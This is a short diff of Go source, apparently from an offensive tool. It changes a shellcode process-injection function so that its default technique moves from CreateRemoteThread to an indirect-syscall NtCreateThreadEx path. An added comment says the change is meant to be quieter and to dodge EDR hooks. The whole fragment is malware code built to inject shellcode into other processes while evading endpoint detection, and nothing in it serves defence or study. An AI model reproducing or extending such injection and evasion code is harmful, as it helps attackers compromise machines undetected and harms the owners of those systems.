@@ -282,7 +282,13 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 	}
 	tech = strings.ToLower(strings.TrimSpace(tech))
 	if tech == "" {
+		// Default technique adapts to the detected EDR posture: when indirect
+		// syscalls are active, prefer a quieter path instead of the loud,
+		// hook-happy CreateRemoteThread.
 		tech = "createremotethread"
+		if useIndirectSyscall {
+			tech = "ntcreatethreadex_indirect"
+		}
 	}
 
 	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
